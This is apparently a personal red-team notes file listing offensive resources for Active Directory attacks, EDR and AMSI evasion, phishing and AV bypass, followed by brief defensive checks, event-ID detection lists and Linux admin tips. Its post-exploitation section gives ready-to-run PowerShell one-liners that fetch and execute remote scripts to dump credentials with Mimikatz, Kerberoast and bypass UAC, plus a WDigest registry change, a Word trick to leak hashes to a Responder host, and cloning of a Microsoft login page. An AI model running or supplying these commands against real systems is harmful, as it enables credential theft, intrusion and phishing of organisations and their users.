# https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/
-----------

-----------OWA to Outlook add-ins
# https://rastamouse.me/2019/03/ews-installapp/
# https://www.youtube.com/watch?v=XFk-b0aT6cs
# https://www.mdsec.co.uk/2019/01/abusing-office-web-add-ins-for-fun-and-limited-profit/
-----------

-----------Donut - Injecting .NET Assemblies as Shellcode
# https://thewover.github.io/Introducing-Donut/
-----------

-----------CobaltStrike - Get Text Messages for your Incoming Beacons
# https://www.fortynorthsecurity.com/aggressor-get-text-messages-for-your-incoming-beacons/
-----------

-----------Generate random artificial intelligence people face to crete fake accounts
# https://thispersondoesnotexist.com/
-----------

-----------Bypass AMSI and WLDP for .NET 
# https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/
-----------

-----------Generate obfuscated .vbs dropper
# https://github.com/s1egesystems/GhostDelivery
-----------

-----------Active Directory Kill Chain Attack
# https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md
### Discovery:
SPN Scanning
	SPN Scanning – Service Discovery without Network Port Scanning
	Active Directory: PowerShell script to list all SPNs used
	Discovering Service Accounts Without Using Privileges
Data Mining
	A Data Hunting Overview
	Push it, Push it Real Good
	Finding Sensitive Data on Domain SQL Servers using PowerUpSQL
	Sensitive Data Discovery in Email with MailSniper
	Remotely Searching for Sensitive Files
User Hunting
	Hidden Administrative Accounts: BloodHound to the Rescue
	Active Directory Recon Without Admin Rights
    Gathering AD Data with the Active Directory PowerShell Module
    Using ActiveDirectory module for Domain Enumeration from PowerShell Constrained Language Mode
    PowerUpSQL Active Directory Recon Functions
    Derivative Local Admin
    Dumping Active Directory Domain Info – with PowerUpSQL!
    Local Group Enumeration
    Attack Mapping With Bloodhound
    Situational Awareness
    Commands for Domain Network Compromise
    A Pentester’s Guide to Group Scoping
LAPS
    Microsoft LAPS Security & Active Directory LAPS Configuration Recon
    Running LAPS with PowerView
    RastaMouse LAPS Part 1 & 2
AppLocker
	Enumerating AppLocker Config

### Privilege Escalation:
Passwords in SYSVOL & Group Policy Preferences
    Finding Passwords in SYSVOL & Exploiting Group Policy Preferences
	Pentesting in the Real World: Group Policy Pwnage
MS14-068 Kerberos Vulnerability
    MS14-068: Vulnerability in (Active Directory) Kerberos Could Allow Elevation of Privilege
    Digging into MS14-068, Exploitation and Defence
    From MS14-068 to Full Compromise – Step by Step
DNSAdmins
    Abusing DNSAdmins privilege for escalation in Active Directory
    From DNSAdmins to Domain Admin, When DNSAdmins is More than Just DNS Administration
Unconstrained Delegation
    Domain Controller Print Server + Unconstrained Kerberos Delegation = Pwned Active Directory Forest
    Active Directory Security Risk #101: Kerberos Unconstrained Delegation (or How Compromise of a Single Server Can Compromise the Domain)
    Unconstrained Delegation Permissions
    Trust? Years to earn, seconds to break
    Hunting in Active Directory: Unconstrained Delegation & Forests Trusts
Constrained Delegation
    Another Word on Delegation
    From Kekeo to Rubeus
    S4U2Pwnage
    Kerberos Delegation, Spns And More...
    Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory
Insecure Group Policy Object Permission Rights
    Abusing GPO Permissions
    A Red Teamer’s Guide to GPOs and OUs
    File templates for GPO Abuse
    GPO Abuse - Part 1
Insecure ACLs Permission Rights
    Exploiting Weak Active Directory Permissions With Powersploit
    Escalating privileges with ACLs in Active Directory
    Abusing Active Directory Permissions with PowerView
    BloodHound 1.3 – The ACL Attack Path Update
    Scanning for Active Directory Privileges & Privileged Accounts
    Active Directory Access Control List – Attacks and Defense
    aclpwn - Active Directory ACL exploitation with BloodHound
Domain Trusts
    A Guide to Attacking Domain Trusts
    It's All About Trust – Forging Kerberos Trust Tickets to Spoof Access across Active Directory Trusts
    Active Directory forest trusts part 1 - How does SID filtering work?
    The Forest Is Under Control. Taking over the entire Active Directory forest
    Not A Security Boundary: Breaking Forest Trusts
    The Trustpocalypse
    Pentesting Active Directory Forests
DCShadow
    Privilege Escalation With DCShadow
    DCShadow
    DCShadow explained: A technical deep dive into the latest AD attack technique
    DCShadow - Silently turn off Active Directory Auditing
    DCShadow - Minimal permissions, Active Directory Deception, Shadowception and more
RID
	Rid Hijacking: When Guests Become Admins
Microsoft SQL Server
	How to get SQL Server Sysadmin Privileges as a Local Admin with PowerUpSQL
	Compromise With Powerupsql – Sql Attacks
Red Forest
	Attack and defend Microsoft Enhanced Security Administrative
Exchange
	Exchange-AD-Privesc
	Abusing Exchange: One API call away from Domain Admin
	NtlmRelayToEWS
NTML Relay
	Pwning with Responder – A Pentester’s Guide
	Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes)
	Relaying credentials everywhere with ntlmrelayx

### Lateral Movement:
Microsoft SQL Server Database links
    SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server!
    SQL Server Link Crawling with PowerUpSQL
Pass The Hash
    Performing Pass-the-hash Attacks With Mimikatz
    How to Pass-the-Hash with Mimikatz
    Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy
System Center Configuration Manager (SCCM)
    Targeted Workstation Compromise With Sccm
    PowerSCCM - PowerShell module to interact with SCCM deployments
WSUS
    Remote Weaponization of WSUS MITM
    WSUSpendu
    Leveraging WSUS – Part One
Password Spraying
    Password Spraying Windows Active Directory Accounts - Tradecraft Security Weekly #5
    Attacking Exchange with MailSniper
    A Password Spraying tool for Active Directory Credentials by Jacob Wilkin
Automated Lateral Movement
    GoFetch is a tool to automatically exercise an attack plan generated by the BloodHound application
    DeathStar - Automate getting Domain Admin using Empire
    ANGRYPUPPY - Bloodhound Attack Path Automation in CobaltStrike

### Defense Evasion:
In-Memory Evasion
    Bypassing Memory Scanners with Cobalt Strike and Gargoyle
    In-Memory Evasions Course
    Bring Your Own Land (BYOL) – A Novel Red Teaming Technique
Endpoint Detection and Response (EDR) Evasion
	Red Teaming in the EDR age
	Sharp-Suite - Process Argument Spoofing
OPSEC
    Modern Defenses and YOU!
    OPSEC Considerations for Beacon Commands
    Red Team Tradecraft and TTP Guidance
    Fighting the Toolset
Microsoft ATA & ATP Evasion
    Red Team Techniques for Evading, Bypassing, and Disabling MS Advanced Threat Protection and Advanced Threat Analytics
    Red Team Revenge - Attacking Microsoft ATA
    Evading Microsoft ATA for Active Directory Domination
PowerShell ScriptBlock Logging Bypass
	PowerShell ScriptBlock Logging Bypass
PowerShell Anti-Malware Scan Interface (AMSI) Bypass
    How to bypass AMSI and execute ANY malicious Powershell code
    AMSI: How Windows 10 Plans to Stop Script-Based Attacks
    AMSI Bypass: Patching Technique
    Invisi-Shell - Hide your Powershell script in plain sight. Bypass all Powershell security features
Loading .NET Assemblies Anti-Malware Scan Interface (AMSI) Bypass
	A PoC function to corrupt the g_amsiContext global variable in clr.dll in .NET Framework Early Access build 3694
AppLocker & Device Guard Bypass
	Living Off The Land Binaries And Scripts - (LOLBins and LOLScripts)
Sysmon Evasion
    Subverting Sysmon: Application of a Formalized Security Product Evasion Methodology
    sysmon-config-bypass-finder
HoneyTokens Evasion
	Forging Trusts for Deception in Active Directory
	Honeypot Buster: A Unique Red-Team Tool
Disabling Security Tools
	Invoke-Phant0m - Windows Event Log Killer

### Credential Dumping:
NTDS.DIT Password Extraction
	How Attackers Pull the Active Directory Database (NTDS.dit) from a Domain Controller
	Extracting Password Hashes From The Ntds.dit File
SAM (Security Accounts Manager)
	Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS
Kerberoasting
	Kerberoasting Without Mimikatz
	Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain
	Extracting Service Account Passwords With Kerberoasting
	Cracking Service Account Passwords with Kerberoasting
	Kerberoast PW list for cracking passwords with complexity requirements
Kerberos AP-REP Roasting
	Roasting AS-REPs
Windows Credential Manager/Vault
	Operational Guidance for Offensive User DPAPI Abuse
	Jumping Network Segregation with RDP
DCSync
	Mimikatz and DCSync and ExtraSids, Oh My
	Mimikatz DCSync Usage, Exploitation, and Detection
	Dump Clear-Text Passwords for All Admins in the Domain Using Mimikatz DCSync
LLMNR/NBT-NS Poisoning
	LLMNR/NBT-NS Poisoning Using Responder
Other
	Compromising Plain Text Passwords In Active Directory

### Persistence:
Golden Ticket
	Golden Ticket
	Kerberos Golden Tickets are Now More Golden
SID History
	Sneaky Active Directory Persistence #14: SID History
Silver Ticket
	How Attackers Use Kerberos Silver Tickets to Exploit Systems
	Sneaky Active Directory Persistence #16: Computer Accounts & Domain Controller Silver Tickets
DCShadow
	Creating Persistence With Dcshadow
AdminSDHolder
	Sneaky Active Directory Persistence #15: Leverage AdminSDHolder & SDProp to (Re)Gain Domain Admin Rights
	Persistence Using Adminsdholder And Sdprop
Group Policy Object
	Sneaky Active Directory Persistence #17: Group Policy
Skeleton Keys
	Unlocking All The Doors To Active Directory With The Skeleton Key Attack
	Skeleton Key
	Attackers Can Now Use Mimikatz to Implant Skeleton Key on Domain Controllers & BackDoor Your Active Directory Forest
SeEnableDelegationPrivilege
	The Most Dangerous User Right You (Probably) Have Never Heard Of
	SeEnableDelegationPrivilege Active Directory Backdoor
Security Support Provider
	Sneaky Active Directory Persistence #12: Malicious Security Support Provider (SSP)
Directory Services Restore Mode
	Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)
	Sneaky Active Directory Persistence #13: DSRM Persistence v2
ACLs & Security Descriptors
	An ACE Up the Sleeve: Designing Active Directory DACL Backdoors
	Shadow Admins – The Stealthy Accounts That You Should Fear The Most
	The Unintended Risks of Trusting Active Directory

### Tools & Scripts:
PowerView - Situational Awareness PowerShell framework
BloodHound - Six Degrees of Domain Admin
Impacket - Impacket is a collection of Python classes for working with network protocols
aclpwn.py - Active Directory ACL exploitation with BloodHound
CrackMapExec - A swiss army knife for pentesting networks
ADACLScanner - A tool with GUI or command linte used to create reports of access control lists (DACLs) and system access control lists (SACLs) in Active Directory
zBang - zBang is a risk assessment tool that detects potential privileged account threats
PowerUpSQL - A PowerShell Toolkit for Attacking SQL Server
Rubeus - Rubeus is a C# toolset for raw Kerberos interaction and abuses
ADRecon - A tool which gathers information about the Active Directory and generates a report which can provide a holistic picture of the current state of the target AD environment
Mimikatz - Utility to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory but also perform pass-the-hash, pass-the-ticket or build Golden tickets
Grouper - A PowerShell script for helping to find vulnerable settings in AD Group Policy.

### Ebooks:
The Dog Whisperer’s Handbook – A Hacker’s Guide to the BloodHound Galaxy
Varonis eBook: Pen Testing Active Directory Environments

### Cheat Sheets:
Tools Cheat Sheets - Tools (PowerView, PowerUp, Empire, and PowerSploit)
DogWhisperer - BloodHound Cypher Cheat Sheet (v2)
PowerView-3.0 tips and tricks
PowerView-2.0 tips and tricks

### Other Resources:
Tactics, Techniques and Procedures for Attacking Active Directory BlackHat Asia 2019
-----------

-----------Active Directory Kill Chain Defense
# https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md
### Tools & Scripts:
Create-Tiers in AD - Project Title Active Directory Auto Deployment of Tiers in any environment
SAMRi10 - Hardening SAM Remote Access in Windows 10/Server 2016
Net Cease - Hardening Net Session Enumeration
PingCastle - A tool designed to assess quickly the Active Directory security level with a methodology based on risk assessment and a maturity framework
Aorato Skeleton Key Malware Remote DC Scanner - Remotely scans for the existence of the Skeleton Key Malware
Reset the krbtgt account password/keys - This script will enable you to reset the krbtgt account password and related keys while minimizing the likelihood of Kerberos authentication issues being caused by the operation
Reset The KrbTgt Account Password/Keys For RWDCs/RODCs
Deploy-Deception - A PowerShell module to deploy active directory decoy objects
dcept - A tool for deploying and detecting use of Active Directory honeytokens
LogonTracer - Investigate malicious Windows logon by visualizing and analyzing Windows event log
DCSYNCMonitor - Monitors for DCSYNC and DCSHADOW attacks and create custom Windows Events for these events
Sigma - Generic Signature Format for SIEM Systems

### Active Directory Security Checks:
General Recommendations
    Manage local Administrator passwords (LAPS).
    Implement RDP Restricted Admin mode (as needed).
    Remove unsupported OSs from the network.
    Monitor scheduled tasks on sensitive systems (DCs, etc.).
    Ensure that OOB management passwords (DSRM) are changed regularly & securely stored.
    Use SMB v2/v3+
    Default domain Administrator & KRBTGT password should be changed every year & when an AD admin leaves.
    Remove trusts that are no longer necessary & enable SID filtering as appropriate.
    All domain authentications should be set (when possible) to: "Send NTLMv2 response onlyrefuse LM & NTLM."
    Block internet access for DCs, servers, & all administration systems.
Protect Admin Credentials
    No "user" or computer accounts in admin groups.
    Ensure all admin accounts are "sensitive & cannot be delegated".
    Add admin accounts to "Protected Users" group (requires Windows Server 2012 R2 Domain Controllers, 2012R2 DFL for domain protection).
    Disable all inactive admin accounts and remove from privileged groups.
Protect AD Admin Credentials
    Limit AD admin membership (DA, EA, Schema Admins, etc.) & only use custom delegation groups.
    ‘Tiered’ Administration mitigating credential theft impact.
    Ensure admins only logon to approved admin workstations & servers.
    Leverage time-based, temporary group membership for all admin accounts
Protect Service Account Credentials
    Limit to systems of the same security level.
    Leverage “(Group) Managed Service Accounts” (or PW >20 characters) to mitigate credential theft (kerberoast).
    Implement FGPP (DFL =>2008) to increase PW requirements for SAs and administrators.
    Logon restrictions – prevent interactive logon & limit logon capability to specific computers.
    Disable inactive SAs & remove from privileged groups.
Protect Resources
    Segment network to protect admin & critical systems.
    Deploy IDS to monitor the internal corporate network.
    Network device & OOB management on separate network.
Protect Domain Controllers
    Only run software & services to support AD.
    Minimal groups (& users) with DC admin/logon rights.
    Ensure patches are applied before running DCPromo (especially MS14-068 and other critical patches).
    Validate scheduled tasks & scripts.
Protect Workstations (& Servers)
    Patch quickly, especially privilege escalation vulnerabilities.
    Deploy security back-port patch (KB2871997).
    Set Wdigest reg key to 0 (KB2871997/Windows 8.1/2012R2+): HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlSecurityProvidersWdigest
    Deploy workstation whitelisting (Microsoft AppLocker) to block code exec in user folders – home dir & profile path.
    Deploy workstation app sandboxing technology (EMET) to mitigate application memory exploits (0-days).
Logging
    Enable enhanced auditing
    “Audit: Force audit policy subcategory settings (Windows Vista or later) to override audit policy category settings”
    Enable PowerShell module logging (“*”) & forward logs to central log server (WEF or other method).
    Enable CMD Process logging & enhancement (KB3004375) and forward logs to central log server.
    SIEM or equivalent to centralize as much log data as possible.
    User Behavioural Analysis system for enhanced knowledge of user activity (such as Microsoft ATA).
Security Pro’s Checks
    Identify who has AD admin rights (domain/forest).
    Identify who can logon to Domain Controllers (& admin rights to virtual environment hosting virtual DCs).
    Scan Active Directory Domains, OUs, AdminSDHolder, & GPOs for inappropriate custom permissions.
    Ensure AD admins (aka Domain Admins) protect their credentials by not logging into untrusted systems (workstations).
    Limit service account rights that are currently DA (or equivalent).
-----------

-----------Active Directory Kill Chain Detection
# https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md
Account and Group Enumeration	
	4798: A user's local group membership was enumerated
	4799: A security-enabled local group membership was enumerated
AdminSDHolder	
	4780: The ACL was set on accounts which are members of administrators groups
Kekeo	
	4624: Account Logon
	4672: Admin Logon
	4768: Kerberos TGS Request
Silver	Ticket	
	4624: Account Logon
	4634: Account Logoff
	4672: Admin Logon
Golden	Ticket	
	4624: Account Logon
	4672: Admin Logon
PowerShell	
	4103: Script Block Logging
	400: Engine Lifecycle
	403: Engine Lifecycle
	4103: Module Logging
	600: Provider Lifecycle
DCShadow	
	4742: A computer account was changed
	5137: A directory service object was created
	5141: A directory service object was deleted
	4929: An Active Directory replica source naming context was removed
Skeleton Keys	
	4673: A privileged service was called
	4611: A trusted logon process has been registered with the Local Security Authority
	4688: A new process has been created
	4689: A new process has exited
PYKEK MS14-068	
	4672: Admin Logon
	4624: Account Logon
	4768: Kerberos TGS Request
Kerberoasting	
	4769: A Kerberos ticket was requested
S4U2Proxy	
	4769: A Kerberos ticket was requested
Lateral Movement	
	4688: A new process has been created
	4689: A process has exited
	4624: An account was successfully logged on
	4625: An account failed to log on
DNSAdmin	
	770: DNS Server plugin DLL has been loaded
	541: The setting serverlevelplugindll on scope . has been set to <dll path>
	150: DNS Server could not load or initialize the plug-in DLL
DCSync	
	4662: An operation was performed on an object
Password Spraying	
	4625: An account failed to log on
	4771: Kerberos pre-authentication failed
	4648: A logon was attempted using explicit credentials
-----------

-----------Active directory enumeration with powershell
# https://www.exploit-db.com/docs/english/46990-active-directory-enumeration-with-powershell.pdf
-----------

-----------Active directory guide to attack domain trust
# https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944
-----------

-----------PRET - Printer Exploitation Toolkit
# https://github.com/RUB-NDS/PRET/blob/master/README.md
-----------

-----------Lync and Skype for Business password spraying and bruteforcing
# https://www.mdsec.co.uk/2017/04/penetration-testing-skype-for-business-exploiting-the-missing-lync/
# https://github.com/mdsecresearch/LyncSniper
-----------

-----------Shellphish - quickily generate login phishing pages of th main social medias
# https://github.com/thelinuxchoice/shellphish
# Phishing Tool for 18 social media: Instagram, Facebook, Snapchat, Github, Twitter, Yahoo, Protonmail, Spotify, Netflix, Linkedin, Wordpress, Origin, Steam, Microsoft, InstaFollowers, Gitlab, Pinterest
-----------

-----------Defeating Windows User Account Control (UAC) by abusing built-in Windows AutoElevate backdoor
# https://github.com/hfiref0x/UACME
-----------

-----------Responder - get credsentials hash from Word document
# https://twitter.com/PythonResponder/status/1161338972955697152
Open Word -> CTRL + F9 -> IMPORT "\\\\Responder-IP\\1.jpg" -> right click and select "Edit Field" -> tick "Data not stored in document" -> save & close
-----------

-----------View all spn (domain controller and other stuff)
setspn -Q */*
-----------

-----------Bypass powershell execution policy
# https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
1- Paste the Script into an Interactive PowerShell Console
2- Echo the Script and Pipe it to PowerShell Standard In
3- Read Script from a File and Pipe to PowerShell Standard In
4- Download Script from URL and Execute with Invoke Expression
5- Use the Command Switch
6- Use the EncodeCommand Switch
7- Use the Invoke-Command Command
8- Use the Invoke-Expression Command
9- Use the “Bypass” Execution Policy Flag
10- Use the “Unrestricted” Execution Policy Flag
11- Use the “Remote-Signed” Execution Policy Flag
12- Disable ExecutionPolicy by Swapping out the AuthorizationManager
13- Set the ExcutionPolicy for the Process Scope
14- Set the ExcutionPolicy for the CurrentUser Scope via Command
15- Set the ExcutionPolicy for the CurrentUser Scope via the Registry
-----------

-----------Group Policy Preferences (GPP) - credentials stored (old domain controllers)
# https://www.andreafortuna.org/2019/02/13/abusing-group-policy-preference-files-for-password-discovery/
dir \\domainame.com\sysvol\*.xml /a-d /s
-----------

-----------Red Team CheatSheet post explotaition
# https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
# Invoke-BypassUAC and start PowerShell prompt as Administrator [Or replace to run any other command]
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"

# Invoke-Mimikatz: Dump credentials from memory
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"

# Import Mimikatz Module to run further commands
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"

# Invoke-MassMimikatz: Use to dump creds on remote host [replace $env:computername with target server name(s)]
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"

# PowerUp: Privilege escalation checks
powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”

# Invoke-Inveigh and log output to file
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y"

# Invoke-Kerberoast and provide Hashcat compatible hashes
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"

# Invoke-ShareFinder and print output to file
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"

# Import PowerView Module to run further commands
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"

# Invoke-Bloodhound
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"

# Find GPP Passwords in SYSVOL
findstr /S cpassword $env:logonserver\sysvol\*.xml
findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)

# Run Powershell prompt as a different user, without loading profile to the machine [replace DOMAIN and USER]
runas /user:DOMAIN\USER /noprofile powershell.exe

# Insert reg key to enable Wdigest on newer versions of Windows
reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1
-----------

-----------Active Directory powershell recon
# https://github.com/PyroTek3/PowerShell-AD-Recon/
powershell.exe -version 2 -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Discover-PSMSSQLServers'); Discover-PSMSSQLServers"
powershell.exe -version 2 -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Find-PSServiceAccounts'); Find-PSServiceAccounts"
powershell.exe -version 2 -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Discover-PSInterestingServices'); Discover-PSInterestingServices"
powershell.exe -version 2 -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Get-PSADForestInfo'); Get-PSADForestInfo"
-----------

-----------Pass the ticket - mimikatz
# https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a
-----------

-----------Bypass Network Access Control (NAC)
# https://github.com/s0lst1c3/silentbridge
-----------

-----------Get domains with reputation (not recommended) - CloudRecoon
# https://github.com/monoxgas/FlyingAFalseFlag
-----------

-----------Build Powershell scripts into (not detectable) executable - PowerLine
# https://github.com/fullmetalcache/PowerLine
-----------

-----------Check mail server reputation, spam filters, etc.
# https://glockapps.com
# https://matrix.spfbl.net/en/8.8.8.8
# https://ipcheck.proofpoint.com/?ip=8.8.8.8
-----------

-----------Privacy domain registration - DNS
# Register one per email to avoid getting multiple domains blocked if reported.
# https://njal.la
-----------

-----------AV signature detection - AntiVirus evasion
# Tool written in python3 to determine where the AV signature is located in a binary/payload
# https://github.com/hegusung/AVSignSeek
-----------

-----------Clone signatures in another binary
# The signatures won't be valid but they can trick some AVs
# https://github.com/secretsquirrel/SigThief
-----------

-----------Self-sign a binary
# https://labs.f-secure.com/archive/masquerading-as-a-windows-system-binary-using-digital-signatures/
-----------

-----------Find Frontable Domains Azure
# https://theobsidiantower.com/2017/07/24/d0a7cfceedc42bdf3a36f2926bd52863ef28befc.html
# https://theobsidiantower.com/assets/known-good.txt
https://censys.io/certificates?q=parsed.names:%20azureedge.net
-----------

-----------Persistence from userland in URI schemas
# https://github.com/giuliocomi/backoori
-----------

-----------Upload files - from .exe to .txt - Windows
certutil -encode m.exe m.txt	--> encode an executable to text
certutil -decode m.txt m.exe	--> decode text and transform to a binary back
-----------

-----------Safe password spraying (avoid account blocking)
# https://github.com/Shellntel/scripts/blob/master/Invoke-SMBAutoBrute.ps1
-----------

-----------Parse downloaded files from CobaltStrike logs
grep -Ri "to download" /opt/cobaltstrike/logs/ | while read -r line; do a=`echo $line | grep -Ri "to download" .`; b=`echo $a | cut -d "/" -f 6`; c=`echo $line | sed 's/.*beacon to download\(.*\)/\1/'`; d=`echo $line | sed 's/.*\/\([0-9]*\.[0-9]*\.[0-9]*\.[0-9]*\).*/\1/g'`; echo "$d --> $c"; done
-----------

-----------Clone dynamic web sites easily
wget -k -K -E -r -l 10 -p -N -F --restrict-file-names=windows -nH https://login.microsoftonline.com
-----------

-----------Fake logon screen (cobalt strike execute-assembly compatible)
# https://github.com/bitsadmin/fakelogonscreen
-----------

-----------In case golden tickets don't work
# https://twitter.com/mpgn_x64/status/1241688547037532161?s=20
-----------
=================================><===

=================================>BLUE TEAM <===
-----------Test BT detection capabilities
# https://github.com/endgameinc/RTA
-----------

-----------Invoke-Adversary - Simulating Adversary Operations
# https://blogs.technet.microsoft.com/motiba/2018/04/09/invoke-adversary-simulating-adversary-operations/
-----------

-----------Get-InjectedThread, look for malware injected in legit process
# https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2
-----------

-----------LOLBins - Windows native executables/libraries/scripts to execute execute code/persistence/elevate etc...
# https://github.com/LOLBAS-Project/LOLBAS/tree/master/yml/OSBinaries
-----------

-----------Thread investigation - risqIQ
# https://riskiq.com
-----------

-----------Malicious URL tracker
# https://urlhaus.abuse.ch/browse/
-----------

-----------Hardening against user sessions enumeration (bloodhound) - netcease 
# https://blog.stealthbits.com/making-internal-reconnaissance-harder-using-netcease-and-samri1o/
-----------
=================================><===

=================================>THREAT INTELLIGENCE <===
-----------Threat Intelligence opne sources
# https://github.com/hslatman/awesome-threat-intelligence
-----------

-----------Attack mitre navigator
# https://mitre-attack.github.io/attack-navigator/enterprise/
-----------
=================================><===

=================================>LINUX & CONFIGUATION <===
-----------Clone USB bit by bit
df -aTh
sudo dd if=/dev/sdb of=~/USB_image
-----------

-----------Disk analyzer
sudo baobab
-----------

-----------Static_net (with virtual interface)
sudo ip addr flush dev eth0
sudo ip addr add X.X.1.23/24 brd + dev eth0
sudo ip route add default via X.X.1.2 dev eth0
sudo echo "nameserver X.8.8.8" > /etc/resolv.conf
sudo chattr +i /etc/resolv.conf
-----------

-----------Dhcp_net
sudo chattr -i /etc/resolv.conf
sudo ip addr flush dev eth0
sudo dhclient eth0
-----------

-----------View route
ip route show       	--> netstat -nr
-----------

-----------C program for SUID (scripts not allowed) (sudo chmod u+s program)
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main()
{
   setuid( 0 );
   system( "sudo ip addr flush dev eth0" );
   system( "sudo ip addr add 172.18.1.X/24 brd + dev eth0" );
  system( "sudo ip route add default via X.X.1.2 dev eth0" );
  system( "echo 'nameserver X.8.8.8' > /etc/resolv.conf" );
   system( "sudo chattr +i /etc/resolv.conf" );
   return 0;
}
-----------

-----------Find SUID files
find / -user root -perm -4000 -exec ls -ldb {} \;
-----------

-----------Delete gest user - Ubuntu
sudo vim /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf
allow-guest=false
-----------

-----------Linux add admin user
sudo adduser pepe aaa
sudo adduser pepe sudo
-----------

-----------Linux system tray icon
sudo add-apt-repository ppa:fossfreedom/indicator-sysmonitor
sudo apt-get update
sudo apt-get install indicator-sysmonitor
-----------

-----------Change pass, different from the sudo command
# Add a pass for su
/etc/sudoers 			--> use visudo to avoid blocking
	Add: Defaults rootpw
-----------

-----------SCP remote to local
# -r for recursive
scp -r pepe@X.X.X.X:/home/pepe/Desktop/Santoku /root/Virtual_Machines/
-----------

-----------SCP local to remote
# -r for recursive
scp -r /home/pepe/Desktop/Santoku pepe@X.X.X.X:/root/Virtual_Machines/
-----------

-----------SCP remote to remote
# -r for recursive
scp your_username@<host1>:/some/remote/directory/foobar.txt your_username@<host2>:/some/remote/directory/
-----------

-----------Screen
screen -S <screenname>			-->	add a screenname
screen -r 						--> list 
screen -r <screenname>			--> attach to the screen
Cntl  A + D						--> detach from the screen
-----------

-----------Tmux
tmux							--> to create a simple screen
tmux new -s <screenname>		--> add a screenname
tmux ls							--> list all screens
tmux attach -t <screenname>		--> attach to the screenname
Cntl B + D						--> detach from the screen
Cntl B + PgeUp					--> scroll mode
-----------

-----------Tmux (screen alternative, it's not possible to create a detachded msfconsole with screen, it dies)
tmux new-session -d -s python_mac 'msfconsole -r python_mac.rc'
tmux ls
echo "#Example attach: tmux attach -t python_mac"
echo "#Detach: Control+B+D"
# It's possible to make a Cron job of it, as it won't duplicate sessions, and if a msf is broken it create a new detached session
-----------

-----------tmux loggin, check if ther is another session, if not it creates a log pipe
# Content of tmux_script.sh
name="addon_windows"
tmux new-session -d -s $name 'msfconsole -r rcscripts/'$name'.rc' 2>&1 | if grep -q duplicate; then echo "Duplicated session bro: "$name; else echo "Created and loggin: "$name; tmux pipe-pane -o -t $name "cat > /root/xxx/logs/"$name"_`date +%F_%T`.log";fi
# Add script to crontab
(crontab -l ; echo \"*/2 * * * * /root/xxx/tmux_script.sh\") | sort | uniq | crontab
-----------

-----------Execute script in the background
script & 				--> background (it dies if SSH is closed)
nohup script & 			--> background (it doesn't die if SSH is closed)
screen script 			--> it's executed in another instance, so it's possible to come back
----------- 

-----------SSH private key auth
ssh-keygen -t rsa -b 4096
